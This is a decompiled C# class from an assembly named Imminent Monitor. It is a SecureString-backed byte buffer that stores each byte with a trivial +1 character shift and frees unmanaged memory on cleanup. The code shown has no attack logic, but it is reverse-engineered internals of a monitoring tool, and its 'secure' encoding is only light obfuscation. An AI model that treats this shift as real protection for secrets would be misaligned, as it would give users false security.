// Decompiled with JetBrains decompiler
// Type: Class44
// Assembly: ImminentMonitor, Version=5.0.0.89, Culture=neutral, PublicKeyToken=null
// MVID: B073CE4A-B7A6-4CA1-871B-499EF3E27493
// Assembly location: C:\Users\Artem\Documents\Code\Imminent Monitor 5\Imminent Monitor.exe

using System;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security;

internal sealed class Class44 : IDisposable, Interface2
{
  private SecureString secureString_0 = new SecureString();

  [SpecialName]
  public int imethod_0() => this.secureString_0.Length;

  public Interface2 imethod_4() => (Interface2) new Class44();

  public void imethod_1(int int_0, out byte byte_0)
  {
    if (int_0 < 0 || int_0 >= this.imethod_0())
      throw new ArgumentOutOfRangeException();
    IntPtr num = IntPtr.Zero;
    char char_0 = char.MinValue;
    try
    {
      num = Marshal.SecureStringToGlobalAllocUnicode(this.secureString_0);
      char_0 = (char) Marshal.ReadInt16(num, int_0 * 2);
      byte_0 = Class44.smethod_1(char_0, int_0);
    }
    finally
    {
      Class78.smethod_3(ref char_0);
      if (num != IntPtr.Zero)
        Marshal.ZeroFreeGlobalAllocUnicode(num);
    }
  }

  public void imethod_2(int int_0, ref byte byte_0)
  {
    for (int length = this.secureString_0.Length; length <= int_0; ++length)
    {
      if (length != int_0)
      {
        this.secureString_0.AppendChar(Class44.smethod_0((byte) 0, length));
      }
      else
      {
        this.secureString_0.AppendChar(Class44.smethod_0(byte_0, length));
        return;
      }
    }
    this.secureString_0.SetAt(int_0, Class44.smethod_0(byte_0, int_0));
  }

  private static char smethod_0(byte byte_0, int int_0) => (char) ((uint) byte_0 + 1U);

  private static byte smethod_1(char char_0, int int_0) => (byte) ((uint) char_0 - 1U);

  public void imethod_3() => this.secureString_0.Clear();

  public void Dispose()
  {
    this.secureString_0.Dispose();
    this.secureString_0 = (SecureString) null;
  }
}
